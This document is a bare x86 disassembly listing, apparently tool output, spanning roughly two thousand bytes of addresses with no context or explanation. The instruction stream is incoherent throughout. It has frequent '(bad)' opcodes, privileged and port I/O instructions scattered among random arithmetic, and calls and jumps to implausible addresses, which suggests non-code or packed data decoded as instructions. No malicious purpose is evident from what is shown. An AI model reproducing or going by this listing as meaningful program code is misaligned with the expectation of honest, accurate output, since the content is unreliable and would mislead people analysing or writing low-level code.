  41422f:	add    BYTE PTR [ecx-0x76c435bb],cl
  414235:	or     dh,cl
  414237:	or     eax,0x8b8d5045
  41423c:	inc    ebp
  41423d:	mov    WORD PTR [ecx+0x3b8a00],?
  414243:	jne    0x414278
  414245:	mov    edi,DWORD PTR [edx+0x8f3b18]
  41424b:	add    DWORD PTR [ebx],eax
  41424d:	add    bh,bh
  41424f:	adc    DWORD PTR [eax],ecx
  414251:	adc    DWORD PTR [ebp+0x55],edi
  414254:	push   es
  414255:	mov    ecx,DWORD PTR [ecx-0x38ff8d70]
  41425b:	mov    ebp,DWORD PTR [eax+ebp*1+0x503a11dc]
  414262:	inc    ebp
  414263:	mov    esp,edi
  414265:	or     al,0xdc
  414267:	push   eax
  414268:	(bad)  
  414269:	jne    0x41421f
  41426b:	call   0x393b5c
  414270:	inc    ebp
  414271:	sar    BYTE PTR [edx],0x84
  414274:	out    dx,al
  414275:	add    bh,al
  414277:	add    BYTE PTR [ebp+esi*2-0x247424],bh
  41427e:	(bad)  
  41427f:	and    al,al
  414281:	fs in  eax,dx
  414283:	inc    DWORD PTR [ebp-0x7b]
  414286:	jo     0x414297
  414288:	leave  
  414289:	scas   al,BYTE PTR es:[edi]
  41428a:	inc    esp
  41428b:	add    BYTE PTR [ebx+ecx*4+0x55f20c10],ch
  414292:	or     BYTE PTR [ebx-0x97717c9],0x83
  414299:	call   DWORD PTR [edi]
  41429b:	shr    ah,0x84
  41429e:	xchg   DWORD PTR [eax],eax
  4142a0:	add    DWORD PTR [eax],eax
  4142a2:	add    bh,bh
  4142a4:	dec    ebp
  4142a5:	and    BYTE PTR [ecx-0x38],dl
  4142a8:	push   eax
  4142a9:	dec    DWORD PTR [ebx+0xfd885]
  4142af:	mov    BYTE PTR [ebp+0x508bac00],cl
  4142b5:	mov    WORD PTR [ecx+0x0],ss
  4142b8:	lea    ecx,[ebx+0x108b20d8]
  4142be:	mov    WORD PTR [edx],ds
  4142c0:	add    BYTE PTR [edi+0xff01ff],al
  4142c6:	mov    ecx,DWORD PTR [ebp-0x28]
  4142c9:	push   ecx
  4142ca:	shl    BYTE PTR [ebp+0x3a],0x8b
  4142ce:	inc    ebp
  4142cf:	in     al,0xeb
  4142d1:	jno    0x41425e
  4142d3:	push   edx
  4142d4:	mov    DWORD PTR [eax-0x28],edx
  4142d7:	mov    eax,DWORD PTR [ebp+0x20]
  4142da:	je     0x414263
  4142dc:	mov    eax,DWORD PTR [ecx]
  4142de:	sbb    BYTE PTR [eax],al
  4142e0:	pop    DWORD PTR [eax]
  4142e2:	add    esi,eax
  4142e4:	add    bl,al
  4142e6:	adc    DWORD PTR [edi],esi
  4142e8:	jmp    0x8bcc933a
  4142ed:	sub    BYTE PTR [ebp+eax*2-0x63c4cf00],cl
  4142f4:	jne    0x414281
  4142f6:	mov    ecx,DWORD PTR [eax]
  4142f8:	in     al,0x75
  4142fa:	pop    DWORD PTR [ecx+0x5501]
  414300:	push   edx
  414301:	inc    DWORD PTR [ebx]
  414303:	adc    BYTE PTR [ecx+0x45721cc6],cl
  414309:	add    BYTE PTR [edi+0x9],dl
  41430c:	call   DWORD PTR [esi]
  41430e:	and    dl,al
  414310:	and    bh,bh
  414312:	inc    edi
  414314:	test   eax,edx
  414316:	sldt   ebx
  414319:	xor    BYTE PTR [eax],al
  41431b:	pushf  
  41431c:	(bad)  
  41431d:	jmp    0x41432b
  41431f:	mov    eax,edi
  414321:	or     al,0x75
  414323:	inc    eax
  414324:	call   0x413a2c
  414329:	mov    eax,eax
  41432b:	loopne 0x4142b1
  41432d:	inc    ebp
  41432e:	add    BYTE PTR [ebx+0x1451c00],cl
  414334:	mov    eax,DWORD PTR [ebp+0x20]
  414337:	add    edi,ecx
  414339:	add    BYTE PTR [eax],ch
  41433b:	cmp    edi,0x18
  41433e:	test   DWORD PTR [ebp+0xf],esi
  414341:	sbb    DWORD PTR [ecx+0x578b0020],0x20
  414348:	jne    0x41434c
  41434a:	call   0xffa03e0f
  41434f:	leave  
  414350:	rcr    BYTE PTR [esp+eax*4],0x55
  414354:	add    ah,ch
  414356:	add    BYTE PTR [edi-0x48fef979],dh
  41435c:	add    BYTE PTR [edx*2+0x75ff3b57],dl
  414363:	inc    esp
  414364:	mov    ebx,DWORD PTR [eax]
  414366:	fcom   st(2)
  414368:	add    BYTE PTR [edi],bl
  41436a:	lea    ecx,[eax-0x18]
  41436d:	(bad)  
  41436e:	push   DWORD PTR [ecx]
  414370:	call   0xffb390d2
  414375:	mov    edx,DWORD PTR [eax+ecx*1-0x1]
  414379:	fstp   DWORD PTR [esi+ebx*8]
  41437c:	push   ebp
  41437d:	pop    ebp
  41437e:	mov    esi,DWORD PTR [edx-0x38]
  414381:	add    DWORD PTR [eax],0x28
  414384:	mov    edi,DWORD PTR [ebx]
  414386:	xor    esi,DWORD PTR [edx+0x3]
  414389:	xor    esi,DWORD PTR [edi+ebx*2-0x75]
  41438d:	pop    ebp
  41438e:	or     al,0x4
  414390:	inc    ecx
  414391:	push   ebp
  414392:	(bad)  
  414393:	in     al,dx
  414394:	or     ah,ch
  414396:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414397:	xbegin 0xffc6b98d
  41439d:	clc    
  41439e:	adc    al,0x45
  4143a0:	div    BYTE PTR [eax]
  4143a2:	or     BYTE PTR [eax+eax*1-0x7e278a39],bl
  4143a9:	test   DWORD PTR [eax+edi*8+0x666300],ebx
  4143b0:	jno    0x414418
  4143b2:	add    eax,DWORD PTR [ebp+0x52]
  4143b5:	adc    eax,0xffffffa0
  4143b8:	xchg   DWORD PTR [ecx+0x4800fc01],ecx
  4143be:	test   DWORD PTR [eax],eax
  4143c0:	clc    
  4143c1:	data16 or al,BYTE PTR [ebp+0x45]
  4143c5:	or     DWORD PTR [ebx-0x3d76d7e0],0xfffffff8
  4143cc:	rol    BYTE PTR [ebp+0x45],1
  4143cf:	mov    DWORD PTR [ebx+0x4d45e0ec],ecx
  4143d5:	mov    DWORD PTR [ecx+0x1845c7e8],ecx
  4143db:	push   ebx
  4143dc:	add    BYTE PTR [ebp+0x0],dl
  4143df:	push   ecx
  4143e0:	jge    0x414415
  4143e2:	add    BYTE PTR [esi+0x4],dl
  4143e5:	jne    0x41444c
  4143e7:	mov    edx,0x457200
  4143ec:	jmp    0x4143b0
  4143ee:	xor    edi,DWORD PTR [ebx]
  4143f0:	pop    edi
  4143f1:	cvtdq2ps xmm7,xmm0
  4143f4:	ret    0x0
  4143f7:	mov    ecx,DWORD PTR [ebx+0x51750ff0]
  4143fd:	xor    ecx,DWORD PTR [edi]
  4143ff:	add    eax,DWORD PTR [ecx+0x3b]
  414402:	push   ebx
  414403:	rdpmc  
  414405:	out    0x8d,al
  414407:	add    BYTE PTR [eax],cl
  414409:	mov    eax,DWORD PTR [ebp-0x743e8b10]
  41440f:	ret    0x450c
  414412:	sbb    al,0x8b
  414414:	cmp    eax,esi
  414416:	or     cl,al
  414418:	or     al,0xc2
  41441a:	pop    eax
  41441b:	inc    ebp
  41441c:	add    ecx,DWORD PTR [edi]
  41441e:	add    esi,DWORD PTR [ebp+0x39]
  414421:	invd   
  414423:	jge    0x41442f
  414425:	mov    eax,0x478ac0
  41442a:	cli    
  41442b:	xor    esp,ecx
  41442d:	mov    ebx,0x5b8ac0
  414432:	ret    0x33
  414435:	mov    eax,0x833b8b
  41443a:	sub    BYTE PTR [ebx],al
  41443c:	inc    ebp
  41443d:	xor    ax,di
  414440:	pushf  
  414441:	inc    bh
  414443:	mov    esp,esp
  414445:	hlt    
  414446:	test   DWORD PTR [ebp-0x8],esi
  414449:	mov    eax,DWORD PTR [ebp-0x14]
  41444c:	xor    ecx,DWORD PTR [ebx-0x76478864]
  414452:	dec    edi
  414453:	or     BYTE PTR [eax],al
  414455:	jne    0x4143e0
  414457:	mov    esi,esp
  414459:	call   0x77a7d01e
  41445e:	inc    ebp
  41445f:	mov    DWORD PTR [eax+0x9c4f0c],edi
  414465:	add    BYTE PTR [ecx-0x3ffe0717],cl
  41446b:	add    BYTE PTR [esi+0x7d],ah
  41446e:	inc    ebp
  41446f:	mov    bx,WORD PTR [ebp+0x8]
  414473:	add    DWORD PTR [ebp+0x55],0x30c008b
  41447a:	inc    ebp
  41447b:	mov    bx,di
  41447e:	lock test BYTE PTR [ecx+0x7000801],bh
  414485:	jge    0x414448
  414487:	mov    ecx,DWORD PTR [ebx-0x630613f0]
  41448d:	cli    
  41448e:	xor    bl,bh
  414490:	add    ecx,DWORD PTR [ebx-0x740ff3a9]
  414496:	test   BYTE PTR [eax],cl
  414498:	add    DWORD PTR [eax+eax*1-0x74ffbb00],eax
  41449f:	cmp    ebp,eax
  4144a1:	xadd   DWORD PTR [ebp+0x66f000c2],ecx
  4144a8:	test   BYTE PTR [ebp+0x1],bh
  4144ab:	mov    ebx,0x458a00
  4144b0:	xor    esi,DWORD PTR [ebx]
  4144b2:	add    esp,DWORD PTR [esi-0x77]
  4144b5:	pop    ebp
  4144b6:	loopne 0x41451e
  4144b8:	inc    ebp
  4144b9:	clc    
  4144ba:	xor    edi,DWORD PTR [ebx]
  4144bc:	add    esi,DWORD PTR [edx-0x77]
  4144bf:	data16 fdivr QWORD PTR [ebp-0x49]
  4144c3:	mov    ebx,0xb78afc
  4144c8:	hlt    
  4144c9:	xor    edi,DWORD PTR [esi]
  4144cb:	data16 add BYTE PTR [ebp+0x66],bl
  4144cf:	data16 lock clc 
  4144d2:	cmp    eax,DWORD PTR ds:[eax]
  4144d5:	ja     0x41453d
  4144d7:	psubq  mm7,QWORD PTR [ebp+0x4]
  4144db:	ltr    WORD PTR [ebp+0x66]
  4144df:	add    esi,eax
  4144e1:	add    di,WORD PTR [ebp+0x2b]
  4144e5:	data16 data16 jge 0x414566
  4144e9:	mov    ebx,0xe08a8b
  4144ee:	jge    0x414523
  4144f0:	data16 data16 xor al,0x5d
  4144f4:	data16 data16 jne 0x4144f0
  4144f8:	mov    edi,DWORD PTR [ebx]
  4144fa:	fdiv   QWORD PTR [edx+0x7d]
  4144fd:	data16 data16 jge 0x414535
  414501:	mov    ebx,0x758a66
  414506:	mov    esi,0x667233
  41450b:	pop    ebp
  41450c:	or     BYTE PTR [esi+0x0],ah
  41450f:	clc    
  414510:	mov    edi,DWORD PTR [ebx]
  414512:	lock ja 0x4144a0
  414515:	(bad)  
  414517:	jge    0x414510
  414519:	invd   
  41451b:	pop    ebp
  41451c:	add    BYTE PTR [ebx],al
  41451e:	(bad)  
  41451f:	cmp    di,WORD PTR [ebp+0xf]
  414523:	data16 sbb bh,BYTE PTR [ebp+0x0]
  414527:	mov    bx,WORD PTR [ebp-0x10]
  41452b:	pop    bp
  41452d:	fbstp  TBYTE PTR [ebx]
  41452f:	test   DWORD PTR [ebx],eax
  414531:	add    BYTE PTR [ebx],bh
  414533:	add    BYTE PTR [esi+0x7d],ah
  414536:	jge    0x4144c3
  414538:	data16 in al,dx
  41453a:	pop    ebp
  41453b:	stc    
  41453c:	bsf    ecx,DWORD PTR [ebp+0x6632009c]
  414543:	mov    edi,ebx
  414545:	in     al,dx
  414546:	test   BYTE PTR [ebp+0x0],bh
  414549:	mov    eax,DWORD PTR [eax]
  41454b:	call   0xbd3e3edb
  414550:	ds pushf 
  414552:	add    BYTE PTR [edx],dh
  414554:	mov    bx,di
  414557:	call   0x8b49c2e7
  41455c:	add    ebp,esp
  41455e:	mov    bx,di
  414561:	jnp    0x414589
  414563:	mov    DWORD PTR [ebx+0x3e7df808],ecx
  414569:	mov    eax,DWORD PTR [eax]
  41456b:	call   0x7c3cd0d6
  414570:	mov    ecx,DWORD PTR [ecx+0x7d030c08]
  414576:	data16 data16 fistp WORD PTR [ebp+0xe]
  41457b:	xor    DWORD PTR [edi-0x48fff7ab],0xfb66f403
  414585:	fisttp WORD PTR [ecx-0x7401f77b]
  41458b:	(bad)  
  41458c:	cld    
  41458d:	jne    0x4145cd
  41458f:	xor    eax,DWORD PTR [eax]
  414591:	mov    esp,DWORD PTR [esi-0x10]
  414594:	sti    
  414595:	repnz mov ebp,DWORD PTR [edi-0xffc76f4]
  41459c:	data16 adc bl,bh
  41459f:	push   ebp
  4145a0:	xor    ecx,DWORD PTR es:[ebx+0x3ee4f88b]
  4145a7:	mov    WORD PTR [eax],es
  4145a9:	pushf  
  4145aa:	data16 xor bh,bl
  4145ad:	mov    DWORD PTR [ebx+0x3550ce4],ecx
  4145b3:	mov    esp,DWORD PTR [esi-0x14]
  4145b6:	fisttp WORD PTR [ebx-0x3748a9f2]
  4145bc:	or     al,0x2b
  4145be:	mov    bh,0xba
  4145c0:	hlt    
  4145c1:	mov    bh,bl
  4145c3:	add    BYTE PTR [ecx-0x7446f3cd],cl
  4145c9:	dec    esi
  4145ca:	or     al,0x0
  4145cc:	mov    edi,DWORD PTR [ebx]
  4145ce:	or     BYTE PTR [ebp+0x3b],dh
  4145d1:	mov    ecx,DWORD PTR [edi]
  4145d3:	fdivr  QWORD PTR [ebx-0x7499ff83]
  4145d9:	xor    al,0xd8
  4145db:	pop    bp
  4145dd:	lock xor esi,DWORD PTR [ebx]
  4145e0:	lea    esp,[esi+0x1f]
  4145e3:	icebp  
  4145e4:	jb     0x4145ea
  4145e6:	add    al,al
  4145e8:	jge    0x4145f6
  4145ea:	mov    eax,eax
  4145ec:	fsubr  st,st(3)
  4145ee:	pop    ebp
  4145ef:	mov    esi,DWORD PTR [ebx]
  4145f1:	in     al,0x8d
  4145f3:	rcr    DWORD PTR [edi],0xc2
  4145f6:	jb     0x414656
  4145f8:	add    cl,cl
  4145fa:	jge    0x414608
  4145fc:	mov    edx,DWORD PTR [ebp-0x20]
  4145ff:	in     al,dx
  414600:	pop    ebp
  414601:	data16 data16 or BYTE PTR [esi+edi*4],bh
  414606:	cmp    di,WORD PTR [ebp+0x0]
  41460a:	mov    ebp,DWORD PTR [ebx]
  41460c:	fdivr  QWORD PTR [esi+0x668a5d]
  414612:	cmp    al,0x33
  414614:	mov    si,0x4e7d
  414618:	mov    eax,DWORD PTR [eax]
  41461a:	lock inc ebp
  41461c:	mov    esi,DWORD PTR [esi]
  41461e:	or     BYTE PTR [edi+esi*8+0x8508ba],bl
  414625:	clc    
  414626:	(bad)  
  414627:	cmp    edi,DWORD PTR [ebx]
  414629:	je     0x41463a
  41462b:	push   ebx
  41462c:	loopne 0x41463d
  41462e:	dec    ecx
  414630:	mov    esp,DWORD PTR [esp+eiz*8-0x33]
  414634:	icebp  
  414635:	mov    esi,0x703084d
  41463a:	pcmpgtd mm6,mm1
  41463d:	add    BYTE PTR [ebp+0x66],dh
  414640:	jmp    0x41460d
  414642:	mov    eax,DWORD PTR [ebx]
  414644:	lock push ebp
  414646:	ror    DWORD PTR [ebp-0x2972feb3],1
  41464c:	or     bh,dl
  41464e:	jb     0x41464e
  414650:	add    BYTE PTR [ebx-0x1a7487b3],cl
  414656:	loopne 0x414658
  414658:	jne    0x41465e
  41465a:	data16 add BYTE PTR [esi+eiz*2],dh
  41465e:	mov    ecx,ebx
  414660:	data16 ds icebp 
  414663:	add    BYTE PTR [esi],bh
  414665:	data16 add bl,cl
  414668:	retw   0xf2
  41466c:	ret    0x66
  41466f:	retf   
  414670:	enterw 0x4df1,0x19
  414675:	pop    edi
  414676:	jne    0x4145f9
  414678:	mov    esi,DWORD PTR [esi]
  41467a:	call   0x77b5d21b
  41467f:	xor    ebp,DWORD PTR [ebx]
  414681:	lea    esp,[esi+0x48]
  414684:	repnz in eax,0x3b
  414687:	add    BYTE PTR [ebp-0x37],dh
  41468a:	xor    edx,DWORD PTR [ebp-0x15]
  41468d:	in     al,dx
  41468e:	xor    edx,DWORD PTR [esi+0x40]
  414691:	mov    DWORD PTR [edi],0x338545fc
  414697:	clc    
  414698:	add    esi,DWORD PTR [ecx]
  41469a:	pop    edi
  41469b:	pushf  
  41469c:	pop    ebx
  41469d:	call   0xff424664
  4146a2:	mov    edi,eax
  4146a4:	push   ecx
  4146a5:	pop    es
  4146a6:	mov    esi,DWORD PTR [edi]
  4146a8:	push   esi
  4146a9:	inc    edi
  4146aa:	add    al,0x70
  4146ac:	add    BYTE PTR [ecx+0x66],ah
  4146af:	(bad)  
  4146b0:	into   
  4146b1:	fs ds int 0x0
  4146b5:	mov    ecx,0x7ce0866
  4146ba:	ret    0x66
  4146bd:	add    bh,al
  4146bf:	add    al,0xfc
  4146c1:	add    BYTE PTR [ebp+0x31c3f866],al
  4146c7:	ds pushf 
  4146c9:	add    BYTE PTR [esi+0x66],ah
  4146cc:	into   
  4146cd:	ret    
  4146ce:	pop    ebp
  4146cf:	adc    al,0x57
  4146d1:	add    BYTE PTR [edi-0x723c409a],dh
  4146d7:	add    edi,edi
  4146d9:	jne    0x414730
  4146db:	lea    edx,[ecx+0x1]
  4146de:	mov    ebx,0xd64ff1
  4146e3:	sar    DWORD PTR [ebx],1
  4146e5:	test   BYTE PTR [ebp+0x38],dh
  4146e8:	mov    DWORD PTR [esp+edi*8-0x76],esp
  4146ec:	push   edi
  4146ed:	xor    BYTE PTR [ebx],0x37
  4146f0:	mov    esi,ebx
  4146f2:	xor    eax,DWORD PTR [eax-0x3c738f9a]
  4146f8:	cmp    BYTE PTR [ebp+0x64],al
  4146fb:	pop    ebx
  4146fc:	mov    ebx,0x9c3b36
  414701:	je     0x41472e
  414703:	xor    edi,DWORD PTR [ebx+0x668a33]
  414709:	mov    WORD PTR [ebx],?
  41470b:	cmp    BYTE PTR [ebx+0x8b4e64],bh
  414711:	pop    edi
  414712:	cmp    ecx,ecx
  414714:	jne    0x41476b
  414716:	mov    ebp,esp
  414718:	cld    
  414719:	push   esi
  41471a:	pop    ebx
  41471b:	inc    ebp
  41471c:	stc    
  41471d:	test   DWORD PTR ss:[eax+edi*8-0x317af642],ebx
  414725:	clc    
  414726:	test   dl,dl
  414728:	cmp    bh,bh
  41472a:	fs pop si
  41472d:	or     bl,al
  41472f:	add    al,0x8b
  414731:	add    BYTE PTR [ecx+0x66],dl
  414734:	push   edi
  414735:	retf   0x3e45
  414738:	add    BYTE PTR ss:[esi+eiz*2-0x3d7a3542],bl
  414740:	clc    
  414741:	add    BYTE PTR [ebx+0x66],bl
  414744:	dec    edx
  414746:	mov    edx,DWORD PTR [edi-0x76]
  414749:	push   edi
  41474a:	add    al,0xb7
  41474c:	xor    al,0xba
  41474e:	cmp    al,0x8d
  414750:	je     0x414751
  414752:	mov    edx,DWORD PTR [ebp-0x46]
  414755:	push   ecx
  414756:	lea    edi,[ebx+0x554fff]
  41475c:	push   ecx
  41475d:	cmp    edx,DWORD PTR [ebx+0x75]
  414760:	mov    ecx,DWORD PTR [ecx+0x723bfcbb]
  414766:	add    BYTE PTR [ebx],dh
  414768:	sub    ecx,DWORD PTR [ebx+0x668a33bb]
  41476e:	add    BYTE PTR [ebx+esi*1+0x4f64bb38],cl
  414775:	mov    ebx,0x3b3b00
  41477a:	jne    0x4147a7
  41477c:	mov    DWORD PTR [ebx+0x728afc],edi
  414782:	xor    esi,DWORD PTR [ebx]
  414784:	mov    edi,DWORD PTR [ebx+0x8d4e33]
  41478a:	push   edi
  41478b:	cmp    esp,ebp
  41478d:	jne    0x41478f
  41478f:	sbb    DWORD PTR [eax],0x8085c3fc
  414795:	clc    
  414796:	inc    edi
  414797:	pop    ebx
  414798:	sti    
  414799:	add    eax,0xeb8bc075
  41479e:	cld    
  41479f:	xor    edi,DWORD PTR ds:0xf8c3855e
  4147a5:	mov    ecx,DWORD PTR [ecx+edx*2]
  4147a8:	rol    DWORD PTR [ebp-0x37],0xf
  4147ac:	mov    DWORD PTR [eax],ecx
  4147ae:	inc    edi
  4147af:	(bad)  
  4147b0:	in     eax,0xfc
  4147b2:	add    bh,bh
  4147b4:	(bad)  
  4147b5:	mov    esi,0xc38a5e
  4147ba:	mov    esi,DWORD PTR [ebx]
  4147bc:	push   ecx
  4147bd:	mov    edi,0xfc4ec7
  4147c2:	test   DWORD PTR [ebp-0x8],edx
  4147c5:	xor    di,ax
  4147c8:	pushf  
  4147c9:	sub    ebp,eax
  4147cb:	inc    ebp
  4147cc:	(bad)  
  4147cd:	sub    edi,edi
  4147cf:	mov    DWORD PTR [ebx+0x3b03ba08],ecx
  4147d5:	inc    ebp
  4147d6:	add    BYTE PTR [esi+0x2b],ah
  4147d9:	or     bh,BYTE PTR [edx+0xf8ac2]
  4147df:	cmp    al,0x33
  4147e1:	mov    edi,DWORD PTR [edx+0xfc4e81]
  4147e7:	(bad)  
  4147e8:	cmp    esi,DWORD PTR [ebx]
  4147ea:	je     0x4147a4
  4147ec:	push   ebx
  4147ed:	dec    esi
  4147ee:	str    ecx
  4147f1:	cmp    esp,DWORD PTR [ebp+esi*2-0x33]
  4147f5:	xor    edi,DWORD PTR [edi+0x789085f]
  4147fb:	mov    edx,DWORD PTR [esp+edi*8]
  4147fe:	add    cl,cl
  414800:	data16 add al,0xcb
  414803:	push   ebp
  414804:	add    ebp,esp
  414806:	jne    0x4147f4
  414808:	(bad)  
  414809:	mov    DWORD PTR [ecx],0xd685f7ec
  41480f:	clc    
  414810:	xlat   BYTE PTR ds:[ebx]
  414811:	inc    ebp
  414812:	mov    esi,DWORD PTR [eax]
  414814:	push   eax
  414815:	pushf  
  414816:	in     eax,0x8b
  414818:	add    ah,ch
  41481a:	add    al,0x55
  41481c:	add    BYTE PTR [ecx+0x66],dl
  41481f:	add    eax,0x3e72cb
  414824:	add    BYTE PTR [ebp+0x66],al
  414827:	(bad)  
  414828:	retf   
  414829:	lock ret 0x85
  41482d:	clc    
  41482e:	inc    bp
  414830:	retf   
  414831:	cmp    eax,0xc77d9cc8
  414836:	ss cld 
  414838:	pushf  
  414839:	test   DWORD PTR [edi-0x8],ebx
  41483c:	je     0x414883
  41483e:	xor    esi,DWORD PTR ds:0x7020840
  414844:	ror    BYTE PTR [ebp-0x37],0x8d
  414848:	push   ebp
  414849:	add    esp,ebp
  41484b:	jb     0x4147d8
  41484d:	add    BYTE PTR [eax],cl
  41484f:	dec    ebp
  414850:	mov    bh,0x81
  414852:	push   esi
  414853:	push   ebp
  414854:	adc    DWORD PTR [ecx-0x3c],0x3e9cff81
  41485b:	xor    al,BYTE PTR [eax]
  41485d:	mov    edx,DWORD PTR [edi+0x10]
  414860:	(bad)  
  414861:	scas   eax,DWORD PTR es:[edi]
  414862:	ret    0x3b
  414865:	jns    0x3b424558
  41486b:	mov    esi,DWORD PTR [eax+edx*1-0x75]
  41486f:	dec    ebp
  414870:	or     BYTE PTR [ebx],ch
  414872:	ret    0x458b
  414875:	lock jmp 0x414869
  414878:	mov    ecx,DWORD PTR [eax]
  41487a:	or     BYTE PTR [edi],al
  41487c:	mov    ecx,eax
  41487e:	xor    DWORD PTR [edx+0x2],0x0
  414882:	mov    bh,0xc1
  414884:	adc    BYTE PTR [eax],dh
  414886:	iret   
  414887:	inc    ebp
  414888:	mov    DWORD PTR [ebx],0x4dfff8c4
  41488e:	inc    BYTE PTR [ebx]
  414890:	ret    0xf8
  414893:	adc    DWORD PTR [esi+0x10],esp
  414896:	clc    
  414897:	dec    ecx
  414898:	fisttp WORD PTR [ecx+0x456604c0]
  41489e:	add    dh,BYTE PTR ds:0x75e0845
  4148a4:	ret    0x4d
  4148a7:	lea    ecx,[ebx+0x18728301]
  4148ad:	add    BYTE PTR [ebp+0x45],al
  4148b0:	xor    ecx,ebp
  4148b2:	pushf  
  4148b3:	add    bh,al
  4148b5:	add    al,ch
  4148b7:	inc    ebp
  4148b8:	test   DWORD PTR [ebx-0x3eba0708],ecx
  4148be:	xor    eax,0x781084d
  4148c3:	push   ebp
  4148c4:	pushf  
  4148c5:	push   ecx
  4148c6:	xor    al,BYTE PTR [ecx+0x32f89c89]
  4148cc:	inc    ebp
  4148cd:	cmp    edi,DWORD PTR [ecx]
  4148cf:	jbe    0x41486d
  4148d1:	mov    eax,edi
  4148d3:	or     ah,dh
  4148d5:	inc    ebp
  4148d6:	test   DWORD PTR [ebx+0x4d450cf8],ecx
  4148dc:	xor    ecx,DWORD PTR [ebx-0x74747664]
  4148e2:	in     al,dx
  4148e3:	hlt    
  4148e4:	push   ebp
  4148e5:	push   ebp
  4148e6:	push   ecx
  4148e7:	push   ecx
  4148e8:	mov    ecx,DWORD PTR [ebx-0x7b7b0708]
  4148ee:	pushf  
  4148ef:	pushf  
  4148f0:	xor    dh,BYTE PTR [edx]
  4148f2:	mov    ecx,DWORD PTR [ecx+0x5bf1f8e8]
  4148f8:	or     BYTE PTR [ebp+0x7],al
  4148fb:	mov    eax,ecx
  4148fd:	clc    
  4148fe:	jb     0x4148c1
  414900:	add    BYTE PTR [ebp+0x55],cl
  414903:	or     DWORD PTR [edi],0xc251d155
  414909:	add    DWORD PTR [ebx+0x32009c],0x8b76453b
  414913:	mov    edi,eax
  414915:	or     cl,al
  414917:	inc    ebp
  414918:	dec    ebp
  414919:	mov    eax,DWORD PTR [ecx+0x514d550c]
  41491f:	or     WORD PTR [ecx],0x899c
  414924:	xor    cl,BYTE PTR [ebx+0x5576fc3b]
  41492a:	mov    edx,DWORD PTR [ecx+0x8]
  41492d:	mov    eax,DWORD PTR [ebp-0x8]
  414930:	mov    eax,DWORD PTR [esp+ecx*1-0x74cdb264]
  414937:	mov    DWORD PTR [ecx+0x4178bf8],ecx
  41493d:	inc    ebp
  41493e:	dec    eax
  41493f:	add    ecx,DWORD PTR [ebx+0x554df0f8]
  414945:	add    edx,DWORD PTR [ecx-0x8]
  414948:	mov    ecx,DWORD PTR [ecx]
  41494a:	clc    
  41494b:	or     BYTE PTR [ebp+eax*2+0x4532409c],al
  414952:	mov    ecx,ebp
  414954:	clc    
  414955:	(bad)  
  414956:	popf   
  414957:	inc    DWORD PTR [eax]
  414959:	ret    0x8b
  41495c:	adc    BYTE PTR [ebx-0x38d4aeb3],cl
  414962:	mov    edi,esp
  414964:	hlt    
  414965:	test   ecx,esi
  414967:	clc    
  414968:	or     BYTE PTR [ebp+0x7],al
  41496b:	xor    cl,al
  41496d:	pushf  
  41496e:	jb     0x4149a3
  414970:	add    BYTE PTR [eax-0x3f],al
  414973:	inc    eax
  414974:	daa    
  414975:	inc    ebp
  414976:	inc    ebp
  414977:	xor    eax,0x7f80803
  41497c:	dec    ebp
  41497d:	pushf  
  41497e:	add    esi,DWORD PTR [edx]
  414980:	clc    
  414981:	cmp    DWORD PTR [ecx],ecx
  414983:	or     al,0x8
  414985:	add    al,BYTE PTR [ebp+0x2c]
  414988:	xor    eax,0x7350845
  41498d:	or     BYTE PTR [ebp+0x7],cl
  414990:	lea    ebx,[ecx+eax*1+0x8b7232]
  414997:	or     al,0x45
  414999:	enter  0x4deb,0x8b
  41499d:	mov    edx,DWORD PTR [eax]
  41499f:	cld    
  4149a0:	dec    ebp
  4149a1:	push   ebp
  4149a2:	sub    edx,DWORD PTR [ecx-0x75]
  4149a5:	add    eax,0xf172fc
  4149aa:	or     BYTE PTR [ebp+0x7],cl
  4149ad:	add    eax,ecx
  4149af:	or     al,0x72
  4149b1:	add    DWORD PTR [eax],eax
  4149b3:	mov    ebx,0x29c2c1
  4149b8:	inc    ebp
  4149b9:	mov    eax,DWORD PTR [ebx]
  4149bb:	cmp    eax,0x3004d1c
  4149c1:	xbegin 0x66c6d5bb
  4149c7:	clc    
  4149c8:	or     BYTE PTR [ebp+0x45],al
  4149cb:	xor    BYTE PTR ds:0x78b089c,dh
  4149d1:	adc    BYTE PTR [ebp+0x45],cl
  4149d4:	lea    eax,[ebp+0x33727501]
  4149da:	add    cl,ch
  4149dc:	inc    ebp
  4149dd:	add    bl,ch
  4149df:	add    BYTE PTR [ebx+0x45850845],cl
  4149e5:	je     0x414972
  4149e7:	push   ebx
  4149e8:	or     al,0x85
  4149ea:	dec    ebp
  4149eb:	std    
  4149ec:	mov    bh,bh
  4149ee:	mov    BYTE PTR [ebp-0x75],al
  4149f1:	mov    edi,eax
  4149f3:	or     al,0x89
  4149f5:	inc    ebp
  4149f6:	clc    
  4149f7:	mov    esp,esp
  4149f9:	hlt    
  4149fa:	call   DWORD PTR [edi-0x37]
  4149fd:	push   ebp
  4149fe:	or     al,0x51
  414a00:	push   ebp
  414a01:	xor    ebp,esp
  414a03:	mov    esi,0x457251
  414a08:	xor    esi,eax
  414a0a:	pushf  
  414a0b:	inc    ebp
  414a0c:	(bad)  
  414a0d:	mov    edi,eax
  414a0f:	or     al,0x85
  414a11:	add    al,bh
  414a13:	inc    eax
  414a15:	mov    esi,DWORD PTR [ebx+ecx*4-0x75]
  414a19:	or     ah,bh
  414a1b:	inc    eax
  414a1c:	push   ebp
  414a1d:	jmp    0x414a70
  414a1f:	mov    eax,DWORD PTR ds:0xe8720c
  414a25:	mov    DWORD PTR [ebp-0x8],eax
  414a28:	jne    0x414a6f
  414a2a:	jmp    0x4149b7
  414a2c:	mov    ebp,DWORD PTR [eax]
  414a2e:	clc    
  414a2f:	retf   0xff55
  414a32:	push   ecx
  414a33:	mov    DWORD PTR ds:0x757210,eax
  414a39:	mov    ecx,DWORD PTR [ebp-0x4]
  414a3c:	sub    esp,DWORD PTR [ebx-0x77]
  414a3f:	dec    DWORD PTR [eax*4-0x74ca8abb]
  414a46:	or     ah,bh
  414a48:	pop    es
  414a49:	ds pushf 
  414a4b:	push   DWORD PTR [edx]
  414a4d:	mov    ecx,DWORD PTR [ebx+0x4dc708f0]
  414a53:	(bad)  
  414a54:	mov    bh,bh
  414a56:	jmp    0x414a44
  414a58:	leave  
  414a59:	jne    0x414a63
  414a5b:	call   0x2e43b5
  414a60:	in     al,dx
  414a61:	dec    ebp
  414a62:	add    dh,BYTE PTR [ebx]
  414a64:	add    BYTE PTR [ebx],al
  414a66:	inc    ebp
  414a67:	cmp    esi,DWORD PTR [ecx]
